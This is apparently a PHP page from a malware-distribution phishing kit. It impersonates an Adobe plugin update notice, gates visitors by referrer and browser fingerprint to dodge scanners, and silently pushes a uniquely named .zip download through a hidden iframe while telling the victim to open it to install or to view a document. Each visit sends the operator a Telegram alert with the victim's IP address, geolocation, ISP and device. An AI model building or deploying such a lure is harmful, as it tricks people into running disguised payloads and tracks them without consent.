<?php
require __DIR__ . '/../lib.php';

// Step 3: must arrive from download.php, full Chrome fingerprint,
// user-initiated navigation (a human clicked "Download Document").
gate_doc(['/download.php'], 4, true);

$name = (string)($_GET['n'] ?? '');
if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
$name = substr($name, 0, 90);
if (!str_ends_with($name, '.zip')) { $name .= '.zip'; }
$tok  = check_token($_GET['tk'] ?? null);
$kind = name_kind($name);

$tk    = rawurlencode($_GET['tk']);
$nameQ = rawurlencode($name);

// Instruction is variant-aware: "to install" for Adobe names,
// "to view your document" for document names.
$instr = ($kind === 'adobe')
    ? 'Open <strong>' . htmlspecialchars($name) . '</strong> from your <strong>Downloads</strong> folder to install.'
    : 'Open <strong>' . htmlspecialchars($name) . '</strong> from your <strong>Downloads</strong> folder to view your document.';

// ---- one Telegram alert per visit (deduped by token nonce) ----
$key = ALERT_DIR . '/al_' . md5($tok['r'] . '|' . $name) . '.fired';
if (!@file_exists($key)) {
    @touch($key);
    $g   = geo(ip());
    $msg = "\x{1F3AF} New Download Triggered \x{1F3AF}\n"
         . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
         . "\x{1F4CD} IP: " . ip() . "\n"
         . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
         . "\x{1F310} ISP: " . $g['isp'] . "\n"
         . "\x{1F4C1} File: " . $name . "\n"
         . "\x{1F4F1} Device: " . ua();
    tg($msg);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Adobe Plugin Required</title>
  <style>
    body {
      font-family: Arial, sans-serif; margin: 0; height: 100vh;
      display: flex; align-items: flex-start; justify-content: center;
      background-color: #f5f5f5; padding-top: 15vh;
    }
    .container { text-align: center; max-width: 600px; margin-top: 0; }
    img { width: 150px; margin-bottom: 20px; }
    a { color: #d32f2f; text-decoration: none; font-weight: bold; }
    a:hover { text-decoration: underline; }
    p { line-height: 1.6; margin: 0; padding: 0 10px; }
  </style>
</head>
<body>
  <div class="container">
    <img src="assets/adobeicon.png" alt="Adobe Icon">
    <p>Sorry, You do not have the latest version of Adobe plugin installed.<br>
    Let's finish your installation.<br><br>
    <?php echo $instr; ?> <a href="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>">Download manually</a>.<br><br>
    Download not working? <a href="#">&#8635; Restart and Download | Get Help</a></p>
  </div>

  <!-- Hidden iframe to trigger the actual (fresh-name, unique-hash) download.
       Sec-Fetch-Dest: iframe, no Sec-Fetch-User — exactly what gate_dl() expects. -->
  <iframe src="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>" style="display:none;" onload="this.remove();"></iframe>
</body>
</html>
